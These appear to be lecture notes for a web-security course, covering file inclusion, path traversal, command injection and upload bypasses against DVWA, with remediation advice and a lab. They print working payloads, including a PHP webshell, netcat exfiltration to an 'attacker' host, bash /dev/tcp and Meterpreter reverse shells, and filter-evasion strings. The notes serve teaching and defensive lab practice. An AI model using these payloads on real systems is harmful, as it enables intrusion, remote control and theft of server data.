OVERVIEW

This Week 6 lecture covers four high-impact web vulnerability classes, explains how each one escalates toward remote code execution (RCE), and closes with defensive coding guidance, a combined exploitation scenario, and lab preparation against DVWA (Damn Vulnerable Web Application)[cite: 3].

The four classes share a single root cause: untrusted input reaches a sensitive operation, such as a file include, a filesystem call, a shell invocation, or a file write, without adequate validation[cite: 3].

01
PART 1

Local and Remote File Inclusion (LFI/RFI)

#

Definition and the PHP include family

File inclusion occurs when user input controls the path passed to a PHP include-family function[cite: 3]. These functions differ mainly in how they fail[cite: 3]. include() and include_once() emit only a warning if the target file is missing, while require() and require_once() halt the script with a fatal error[cite: 3]. The _once variants also prevent the same file from being included twice[cite: 3].

Function[cite: 3] On missing file[cite: 3] Re-include?[cite: 3]
include()[cite: 3] Warning only[cite: 3] Yes, on every call[cite: 3]
require()[cite: 3] Fatal error[cite: 3] Yes, on every call[cite: 3]
include_once()[cite: 3] Warning only[cite: 3] No, included once[cite: 3]
require_once()[cite: 3] Fatal error[cite: 3] No, included once[cite: 3]

The vulnerable pattern is a page loader that passes a request parameter straight to include[cite: 3]. An attacker who controls that parameter can point it at any file the web process can read[cite: 3].

Vulnerable Include Payload[cite: 3]
<?php // developer never validated the page parameter include($_GET['page']); // attacker: ?page=../../../../etc/passwd // attacker: ?page=http://attacker.com/shell.txt ?>

LFI versus RFI, and the allow_url_include switch

The lecture separates two attack types[cite: 3]. Local File Inclusion (LFI) lets an attacker read or execute files already on the server, such as configuration files, logs, and session data, by climbing the directory tree with ../ sequences[cite: 3]. Remote File Inclusion (RFI) causes the server to fetch and execute PHP code from an attacker-controlled URL, which yields direct RCE as the web-server user[cite: 3]. A single PHP setting, allow_url_include, decides whether an include-family function may pull code from a remote URL[cite: 3]. It is Off by default in modern PHP, so RFI usually fails, but LFI remains dangerous because it can be escalated to RCE[cite: 3].

Dimension[cite: 3] LFI (Local File Inclusion)[cite: 3] RFI (Remote File Inclusion)[cite: 3]
Precondition[cite: 3] Path argument is user-controlled[cite: 3] Path is user-controlled AND allow_url_include = On AND payload starts with http(s)://[cite: 3]
Example payload[cite: 3] ?page=../../../../etc/passwd[cite: 3] ?page=http://attacker.com/shell.txt[cite: 3]
Risk level[cite: 3] High: disclosure, escalates to RCE via poisoning[cite: 3] Critical: instant RCE[cite: 3]
Typical outcome[cite: 3] Source disclosure, credential theft, then RCE via log or session poisoning or php://input[cite: 3] Attacker-controlled PHP body is fetched and executed by the victim server[cite: 3]
Default PHP config[cite: 3] Exploitable whenever the path is unfiltered[cite: 3] Blocked, since allow_url_include = Off by default[cite: 3]
Primary defense[cite: 3] Strict allow-list; canonicalize and verify the path lies within the base directory[cite: 3] Keep allow_url_include = Off; same allow-list controls; disable allow_url_fopen if unused[cite: 3]

A useful mental model: LFI is a locality problem (where can the path point on this machine?), and RFI is a protocol problem (can the path point off the machine?)[cite: 3]. Both share one fix[cite: 3]. Raw user input should never reach an include-family path argument[cite: 3].

LFI mechanics and file disclosure

A benign page request such as index.php?page=about.php resolves to a file in the pages directory[cite: 3]. The moment the developer concatenates the parameter into the path without filtering, ../ sequences escape that directory[cite: 3]. Each ../ moves one level toward the filesystem root, so enough of them land at / before the target path is appended[cite: 3]. Common disclosure targets include /etc/passwd as proof of read, /proc/self/environ for environment variables, and /var/www/.htpasswd for credentials[cite: 3].

PHP wrappers and escalation from LFI to RCE

When RFI is blocked, the lecture shows that plain LFI can still reach code execution through several routes[cite: 3]. The php://filter wrapper reads a PHP file's source as base64 text rather than executing it, which typically exposes database credentials once the string is decoded[cite: 3]. The php://input wrapper treats the raw POST body as the included file, so PHP code sent in the body is executed[cite: 3].

PHP Wrappers[cite: 3]
# Read PHP source as base64 (avoids execution): ?page=php://filter/convert.base64-encode/resource=config.php # returns a base64 string; decode it to read the source and DB credentials # Execute code from the POST body: ?page=php://input POST body: <?php system('id');?>

Log poisoning works by sending a request whose User-Agent header contains PHP code[cite: 3]. The server writes that header into its access log, and including the log file through the LFI then executes the embedded code[cite: 3]. Session poisoning follows the same pattern: a payload is stored in a session variable, such as a username field, which lands in a file like /var/lib/php/sessions/sess_<PHPSESSID>, and including that file runs the payload[cite: 3].

PART 2

Path Traversal

#

Path traversal manipulates file-path input so that the application opens a file outside its intended directory[cite: 3]. The distinction from LFI is one of scope[cite: 3]. Traversal can reach any file-access function, including readfile, file_get_contents, and fopen, while LFI specifically targets the include family and usually results in code execution[cite: 3].

A typical vulnerable endpoint concatenates a file parameter onto a base directory and passes the result to readfile[cite: 3]. Requesting download.php?f=../../../../etc/passwd from a script located in /var/www/html/uploads/ climbs four levels and reads /etc/passwd[cite: 3].

Path Traversal Payload[cite: 3]
# download.php <?php readfile("/var/www/html/uploads/" . $_GET['f']); ?> GET /download.php?f=../../../../etc/passwd

Common vulnerable parameters

Path traversal appears wherever an application takes a filename from the request[cite: 3]. The lecture lists file downloads (?file=report.pdf), image display (?img=/uploads/avatar.png), log viewers (?log=access), template loaders (?tpl=header.html), and document renderers (?doc=invoice_2024.pdf) as typical sinks[cite: 3].

Encoding bypasses

Encoding attacks succeed when the filter inspects the raw input, but the application decodes the input later[cite: 3]. The check and the use then see different strings[cite: 3]. A filter that searches for the literal ../ will not match %2e%2e%2f, yet the application may decode that value into ../ at the point of use[cite: 3]. Double encoding (%252e%252e%252f) survives two decode passes[cite: 3]. Other forms the lecture mentions include null-byte injection (file.php%00.jpg, which truncated older PHP strings at the null byte, fixed in PHP 5.3.4) and mixed separators such as ..\ on Windows targets[cite: 3].

Encoding Bypass Payload[cite: 3]
# Filter strips literal "../"; attacker sends the encoded form: ?f=%2e%2e%2f%2e%2e%2fetc%2fpasswd # Double-encoded form survives two decodes: ?f=%252e%252e%252f -> decode -> %2e%2e%2f -> decode ->../

Why blacklisting ../ fails

PHP's str_replace is non-recursive, so removing ../ once can recreate the sequence[cite: 3]. Given the input ....//....//etc/passwd, the single pass removes the inner ../ and the surrounding dots and slashes recombine into ../../etc/passwd[cite: 3]. Absolute paths defeat the same filter from a different angle[cite: 3]. If the application prepends a base directory but then accepts an absolute path, supplying /etc/passwd replaces the base entirely, and no ../ appears in the input at all[cite: 3].

Filter Bypasses[cite: 3]
# non-recursive strip bypass $input = "....//....//etc/passwd"; $clean = str_replace("../", "", $input); // -> "../../etc/passwd" # absolute path override $f = "/var/www/uploads/" . $_GET['f']; ?f=/etc/passwd // -> "/etc/passwd"

The lesson is that a blacklist on ../ misses encodings, recursive-strip bypasses, and absolute paths[cite: 3]. The reliable fix is to canonicalize the path first and then verify that the result stays within the base directory[cite: 3].

PART 3

Command Injection

#

Week 3 introduced command injection, including the distinction between blind and active variants and basic enumeration[cite: 3]. This week's coverage goes deeper into operator semantics, filter evasion, and escalation to an interactive reverse shell[cite: 3]. The vulnerable pattern is a network diagnostics page that concatenates user input raw into a shell string[cite: 3].

Command Injection Payload[cite: 3]
# diag.php - "network diagnostics" <?php echo shell_exec("ping -c 4 ". $_GET['ip']); ?> GET /diag.php?ip=127.0.0.1;whoami # sequential GET /diag.php?ip=127.0.0.1 && whoami # conditional

Both payloads work because the ip value reaches /bin/sh unescaped[cite: 3]. Any shell metacharacter inside it is interpreted by the shell, so the developer loses control of where the command ends[cite: 3].

Command-chaining operators

Each operator has a distinct semantic, and choosing the right one matters when only one outcome can be observed[cite: 3]. The semicolon is the default because it runs the second command unconditionally[cite: 3]. The && operator runs the second command only if the first exits with status zero, which suits cases where the first command must succeed[cite: 3]. The || operator runs the second command only on failure, which helps when the first command must fail, such as an unreachable host[cite: 3]. The pipe | feeds the first command's output into the second, which is useful for exfiltration[cite: 3]. Backticks and $() substitute the inner command's output into an argument, and the > and >> redirections write output to a file that can be read back later through an LFI or webshell[cite: 3].

Operator[cite: 3] Behavior[cite: 3] Example[cite: 3] Use when[cite: 3]
;[cite: 3] Runs second command unconditionally[cite: 3] ping -c 4 127.0.0.1;whoami[cite: 3] Default; second payload always wanted[cite: 3]
&&[cite: 3] Runs second only if first succeeds[cite: 3] ping -c 4 127.0.0.1 && id[cite: 3] First command must validate something[cite: 3]
||[cite: 3] Runs second only if first fails[cite: 3] ping -c 4 invalid || id[cite: 3] First command must fail to trigger payload[cite: 3]
|[cite: 3] Pipes stdout of first into second[cite: 3] cat /etc/passwd | nc attacker 4444[cite: 3] Output must feed the next command (exfiltration)[cite: 3]
`cmd` / $(cmd)[cite: 3] Substitutes inner output inline[cite: 3] echo "$(whoami)"[cite: 3] Payload must sit inside an argument[cite: 3]
>, >>[cite: 3] Redirects output to a file[cite: 3] id > /tmp/out[cite: 3] Blind exfiltration to a readable file[cite: 3]

Filter and WAF bypass techniques

A blocked character is rarely a closed door, because the shell offers several equivalent spellings for the same token[cite: 3]. When a space is filtered, the $IFS variable (Internal Field Separator, whose default value is whitespace) substitutes for it, and alternatives such as ${IFS}, {cat,/etc/passwd}, or a redirection like </etc/passwd also work[cite: 3]. When a keyword is blocked, quote characters, empty variables, and glob patterns can rebuild it, because the shell strips quotes and expands variables before executing[cite: 3]. Encoding the payload, for example by base64-decoding it on the target, hides it from pattern-based filters entirely[cite: 3].

Filter Evasion Payload[cite: 3]
# Blocked space -> $IFS ?f=127.0.0.1;cat$IFS/etc/passwd # Blocked keyword "whoami" -> quote splitting, empty variable, glob ?f=;w'h'oami;w"h"oami;who${empty}ami;/???/??ami # Encoded payload decoded on the victim ?f=;echo d2hvYW1pCg== | base64 -d | sh

The unifying principle is that the shell evaluates variables, globs, and quotes before it runs a command[cite: 3]. Any filter that inspects the raw string earlier in that pipeline can be evaded by spelling the forbidden token in a form that resolves to it later[cite: 3].

Escalation to a reverse shell

A single injection is enough to push a connection back to the attacker's listener, which yields an interactive shell[cite: 3]. The lecture offers several options depending on what the target provides[cite: 3]. Netcat with the -e flag is the simplest, but many distributions ship an OpenBSD build of nc that lacks -e[cite: 3]. The bash /dev/tcp pseudo-device needs no netcat at all, and Python and Perl one-liners serve as fallbacks when those interpreters are present[cite: 3]. Even blind injection, with no visible output, can deliver a reverse shell, because the command still runs[cite: 3].

Reverse Shell Payload[cite: 3]
# Attacker listener $ nc -lvnp 4444 # Netcat with -e GET /diag.php?ip=127.0.0.1;nc -e /bin/bash 10.10.14.7 4444 # Bash built-in, no nc needed GET /diag.php?ip=127.0.0.1;bash -i >& /dev/tcp/10.10.14.7/4444 0>&1

PART 4

File Upload Vulnerabilities (DVWA)

#

An upload feature that writes attacker-supplied code into a web-accessible directory gives the attacker a webshell, and a webshell provides command execution as the web-server user[cite: 3]. The lecture uses DVWA, with its three security levels (Low, Medium, High), to show that each level adds one check and that each check has a matching bypass[cite: 3]. The source for these checks is on GitHub at digininja/DVWA[cite: 3].

Low: no validation

The Low level performs no checks at all[cite: 3]. A local file containing a one-line PHP webshell is uploaded directly, and the attacker then requests it from the uploads directory with a cmd parameter[cite: 3]. Because the file sits inside the web root with an executable extension, the server parses and runs it[cite: 3].

Webshell Payload[cite: 3]
# shell.php <?php system($_GET['cmd']); ?> GET /DVWA/hackable/uploads/shell.php?cmd=whoami -> www-data

Medium: Content-Type check

The Medium level reads $_FILES['file']['type'] and accepts only image/jpeg or image/png[cite: 3]. That value comes from the Content-Type header in the multipart part, which the client sets[cite: 3]. The server therefore trusts an attacker-controlled value[cite: 3]. Intercepting the upload in Burp Suite and changing the inner part header to image/jpeg, while leaving the PHP body and the filename shell.php unchanged, passes the check[cite: 3]. The file is stored with its PHP content intact[cite: 3].

High: extension whitelist and getimagesize()

The High level enforces an extension whitelist and calls getimagesize() on the uploaded bytes, which must report valid image dimensions[cite: 3]. getimagesize() identifies a file by its magic bytes, the leading signature that declares its format[cite: 3]. Prepending a valid GIF header (GIF89a;) to the PHP code satisfies that check, and naming the file shell.php.jpg satisfies the extension whitelist[cite: 3]. Whether the server then runs the file as PHP depends on configuration[cite: 3]. By default, Apache uses the last extension (.jpg) and serves the file as an image, so the attacker must sometimes rename it afterward[cite: 3].

Magic Bytes Payload[cite: 3]
$ printf 'GIF89a;\n<?php system($_GET["cmd"]);?>' > shell.php # upload as shell.php.jpg GET /DVWA/hackable/uploads/shell.php.jpg?cmd=whoami

Level comparison

Level[cite: 3] Check performed[cite: 3] Bypass technique[cite: 3] Payload[cite: 3]
Low[cite: 3] None[cite: 3] Direct upload[cite: 3] shell.php with the system() one-liner[cite: 3]
Medium[cite: 3] Client-supplied Content-Type in {image/jpeg, image/png}[cite: 3] Content-Type spoof via Burp Repeater; body and filename unchanged[cite: 3] Inner Content-Type set to image/jpeg[cite: 3]
High[cite: 3] Extension whitelist and getimagesize() on bytes[cite: 3] Prepend GIF89a; magic bytes; use double extension shell.php.jpg[cite: 3] containing GIF89a; followed by PHP[cite: 3]

The pattern across levels is that every check inspects a single dimension (name, MIME type, or bytes), and every bypass targets exactly that dimension[cite: 3]. Effective defense therefore means stacking orthogonal checks rather than repeating the same one[cite: 3].

Full escalation chain: upload to Meterpreter

The High-level bypass produces a webshell, and the webshell can then promote itself into a richer foothold[cite: 3]. The attacker first confirms execution with whoami[cite: 3]. Next, the webshell renames the double-extension file to a clean .php name, which guarantees PHP execution[cite: 3]. Finally, a Meterpreter payload built with msfvenom is uploaded through the same bypass and triggered by requesting it, while a multi/handler listener catches the connection[cite: 3]. The result is persistent, multi-channel access suitable for post-exploitation[cite: 3].

Meterpreter Escalation[cite: 3]
# Step 2: rename via the webshell GET /DVWA/hackable/uploads/shell.php.jpg?cmd=mv shell.php.jpg shell.php # Step 3: build payload and start handler $ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f raw > msf.php msf6 > use exploit/multi/handler msf6 > set PAYLOAD php/meterpreter/reverse_tcp msf6 > run # browse to /hackable/uploads/msf.php, then: meterpreter > getuid

PART 5

Defensive Coding and Remediation

#

The four classes share a defensive shape: do not pass untrusted input to filesystem, include, or shell APIs, and where unavoidable, constrain the input to a known-good set before it arrives there[cite: 3]. The lecture ties the classes to two OWASP Top 10 categories[cite: 3]. Command injection and file inclusion fall under A03 (Injection), while path traversal and upload abuse fall under A01 (Broken Access Control)[cite: 3].

File inclusion and path traversal

For file inclusion, the strongest defense is to avoid dynamic include paths altogether[cite: 3]. A router or switch statement on a fixed page identifier, or an allow-list array that maps ?page=about to pages/about.php, removes user control over the path[cite: 3]. Where remote includes are not required, allow_url_include and allow_url_fopen should be disabled in php.ini[cite: 3]. The dangerous wrappers and functions can be restricted through disable_functions, and file access can be confined with open_basedir[cite: 3]. Logs and session storage should live outside the web root without PHP execution permissions, which blunts log and session poisoning[cite: 3].

For path traversal, the correct order is canonicalize first, then check[cite: 3]. realpath() resolves ../, symlinks, and encodings into one absolute path, and the result must begin with the base directory followed by a separator[cite: 3]. basename() helps but cannot prevent a symlink escape on its own, and stripping ../ from raw input should never be relied on[cite: 3].

Path Canonicalization Fix[cite: 3]
$base = realpath('/var/www/uploads'); $target = realpath($base . '/'. $_GET['f']); if ($target === false || strpos($target, $base. '/')!== 0) { http_response_code(403); exit('forbidden'); } readfile($target); // safe

Command injection

The core rule is never to build a shell string from user input[cite: 3]. In Python, arguments should be passed as a list with shell=False so that no shell parses them[cite: 3]. In PHP, escapeshellarg() must wrap each value when a shell is unavoidable[cite: 3]. Inputs should also be validated strictly, so an IP parameter is parsed as an IP address and a hostname parameter is checked against hostname syntax, and the process should run as a least-privilege account with no sudo or NOPASSWD rights[cite: 3].

Command Injection Fix[cite: 3]
# Python: list arguments, no shell subprocess.run(["ping", "-c", "4", user_ip], shell=False) // PHP: escape each value shell_exec("ping -c 4 ". escapeshellarg($_GET['ip']));

File upload (defense in depth)

No single upload control is sufficient, so the lecture recommends layering several[cite: 3]. Validate the file by its actual content rather than the client-supplied Content-Type, and verify that the magic bytes match the claimed type[cite: 3]. Re-encoding images through GD or ImageMagick and rejecting files that fail to decode defeats polyglot payloads such as GIF89a; prefixes[cite: 3]. Server-chosen random names with a single whitelisted extension remove both the attacker's filename and double-extension tricks[cite: 3]. Uploads should be stored outside the web root and served through a download script[cite: 3]. Script execution must be disabled in the upload directory, for example with php_flag engine off in Apache or a location block that returns 403 for PHP files in nginx[cite: 3]. Size and rate limits round out the controls against abuse and staging attacks[cite: 3].

Common Misconceptions and Real-World Breaches

#

Common Misconceptions

Three beliefs quietly break production systems[cite: 3]. The first is that blacklisting ../ stops path traversal[cite: 3]. The ../ token is the visible attack string, so blocking it feels complete, yet encodings, recursive-strip bypasses, mixed separators, and absolute paths all evade a literal blacklist[cite: 3]. Canonicalize-then-verify is the only robust fix[cite: 3].

The second is that checking the file extension makes uploads safe[cite: 3]. Double extensions, Content-Type spoofing, and magic-byte spoofing each bypass a name-only check, so defense must also validate content, disable script execution in the upload directory, and store files outside the web root[cite: 3].

The third is that command injection matters only when output is visible[cite: 3]. Blind injection still executes the command[cite: 3]. Attackers use time-based detection (for example;sleep 5), out-of-band DNS or HTTP exfiltration, or a reverse shell that calls back regardless of whether the page reflects any output[cite: 3].

Real-World Breaches

Year and product[cite: 3] Vulnerability[cite: 3] Impact[cite: 3]
2017, Apache Struts[cite: 3] CVE-2017-5638: crafted Content-Type header triggers OGNL expression during error handling; file-upload-related RCE[cite: 3] Attacker code execution on Struts servers; roughly 147 million US consumer records exposed[cite: 3]
2019 to 2020, Citrix ADC / NetScaler[cite: 3] CVE-2019-19781: unauthenticated directory traversal wrote a payload under /vpns/templates/, which the appliance then executed[cite: 3] Traversal combined with upload gave full RCE on gateway appliances[cite: 3]
2018, Drupal[cite: 3] Drupalgeddon2, CVE-2018-7600: crafted request to a form-upload endpoint reached system() through the form rendering pipeline[cite: 3] Single unauthenticated POST gave RCE; roughly 1 million Drupal sites compromised before patching[cite: 3]

SCENARIO

Closing Scenario: DVWA Medium Upload and Unsanitized Ping

#

The lecture closes with a three-part exercise that chains two vulnerabilities at DVWA Medium security[cite: 3]. The upload filter checks only the client-supplied Content-Type header, and a separate Network Diagnostics page runs ping -c 4 with unsanitized input through shell_exec()[cite: 3]. The goal is full RCE with an interactive shell, plus proof that the attacker can manipulate the upload directory[cite: 3].

Part (a) asks for the upload bypass[cite: 3]. The model answer uses Burp Repeater to change only the inner Content-Type of the multipart part to image/jpeg[cite: 3]. The filename and PHP body stay the same, so the file is stored as shell.php because DVWA Medium trusts the header that PHP populates from the request[cite: 3].

Part (b) confirms injection and then escalates[cite: 3]. A payload such as ;id confirms command execution because the output is reflected[cite: 3]. The reverse shell payload uses bash /dev/tcp with a netcat listener on port 4444[cite: 3]. The semicolon is preferred over && because the shell should run even if the ping fails, and the bash /dev/tcp form is preferred over nc -e because Debian's OpenBSD netcat does not include that flag[cite: 3].

Part (c) combines the two[cite: 3]. From the www-data shell, the attacker moves into the upload directory and renames or copies the double-extension file to a clean .php name, creating a persistent webshell[cite: 3]. The outcome is a cleanly named webshell, an interactive www-data shell, and write access to the upload directory, which allows further staging such as a Meterpreter payload[cite: 3]. The chain defeats the Medium MIME check and the unfiltered ping input, then turns a fragile double-extension file into a durable foothold[cite: 3].

LAB & GLOSSARY

Lab Preparation, Glossary and Key Takeaways

#

Lab Preparation and Assignment

The lab builds directly on the lecture, and every payload on the reference cards is one students will fire in DVWA[cite: 3]. Preparation starts with setting the DVWA security level in the DVWA Security tab before each attempt, because the level is held in a session cookie and a stale Low setting makes a Medium bypass appear to work without proving anything[cite: 3]. Default credentials are admin and password[cite: 3]. The toolset includes Burp Suite Community (Repeater and Intercept), netcat for listeners, msfvenom and msfconsole for Meterpreter, and a local Linux shell for crafting payloads[cite: 3].

The assignment has three deliverables, each documented with screenshots, the exact payload, and a one-line outcome statement[cite: 3]:

  1. First, complete the file upload bypass at all three DVWA levels (Low, Medium, High) and capture a screenshot of each successful whoami response[cite: 3].
  2. Second, use the resulting webshell to perform one LFI-based file read, either ../../../../etc/passwd or a php://filter read of config.php that leaks the database password[cite: 3].
  3. Third, deliver one command-injection reverse shell using bash -i >& /dev/tcp/<yourip>/4444 0>&1 with a netcat listener, either from the diagnostics module or through the webshell[cite: 3]. Submission is due before the next lecture[cite: 3].
WEEK 6 LAB CHECKLIST

DVWA Activities

Task 01

Set DVWA security level in the DVWA Security tab before each attempt[cite: 3].

Task 02

Complete the file upload bypass at all three DVWA levels (Low, Medium, High) and capture a screenshot of each successful whoami response[cite: 3].

Task 03

Use the resulting webshell to perform one LFI-based file read (e.g. php://filter read of config.php)[cite: 3].

Task 04

Common pitfalls

Four mistakes recur[cite: 3]. Students forget to set the DVWA security level before a bypass, so a Low-level result is mistaken for a Medium bypass[cite: 3]. They confuse the Medium Content-Type spoof, which works because the header is client-controlled, with High, where spoofing the header alone fails because getimagesize() reads the bytes and magic bytes must be prepended[cite: 3]. They expect .php.jpg to execute on servers that are not configured for double-extension handling, when Apache serves the last extension as an image; the fix is to rename through the webshell or use an .htaccess or AddHandler misconfiguration[cite: 3]. Finally, they forget that allow_url_include is Off on modern PHP, so RFI payloads fail silently, and the correct move is LFI-to-RCE escalation through log poisoning, session poisoning, or php://input[cite: 3].

Suggested reading

The lecture recommends the OWASP Path Traversal and Command Injection pages, the OWASP Unrestricted File Upload Cheat Sheet, and the DVWA source at github.com/digininja/DVWA, where students should read the actual PHP checks for each security level[cite: 3].

$IFS[cite: 3] Shell Internal Field Separator; default whitespace used to bypass space filters[cite: 3]
File upload[cite: 3] Endpoint that writes user files to disk; leads to RCE if name and content are attacker-controlled[cite: 3]
Magic bytes[cite: 3] Leading bytes identifying a file format (for example GIF89a;); spoofable[cite: 3]
getimagesize()[cite: 3] PHP function that trusts magic bytes, bypassed by prepending a valid image header[cite: 3]
Defense in depth[cite: 3] Stacking independent controls so no single bypass compromises the system[cite: 3]

Key Takeaways

  • P1, LFI and RFI: include-family functions with a user-controlled path[cite: 3]. allow_url_include decides whether the attack is RFI or LFI, and wrappers and poisoning turn LFI into RCE[cite: 3].
  • P2, path traversal: escaping the base directory with ../[cite: 3]. Encodings and recursive-strip bypasses defeat blacklists, so the defense is canonicalize-then-verify[cite: 3].
  • P3, command injection: operators (;, &&, ||, |, and command substitution) let an attacker append commands[cite: 3]. Filters are bypassed with $IFS, case and quote tricks, and encoding, and the attack escalates to a reverse shell[cite: 3].
  • P4, file upload: DVWA Low has no checks, Medium trusts the Content-Type header, and High checks the extension and magic bytes[cite: 3]. Bypasses spoof the MIME type, then prepend magic bytes and use a double extension, and finally rename the file to a clean .php[cite: 3].
  • P5, defense: apply defense in depth across all four classes[cite: 3]. Avoid dynamic paths and shell strings, allow-list inputs, canonicalize paths, validate uploads by content, and disable execution in upload directories[cite: 3].

The durable pattern across all four classes is that untrusted input reaches a sensitive sink, and naive filters fail because the check and the consumer see different representations of the same input[cite: 3]. The fixes are structural[cite: 3]. Remove user control over paths and shell strings where possible, and stack independent controls so that no single bypass leads to compromise[cite: 3].
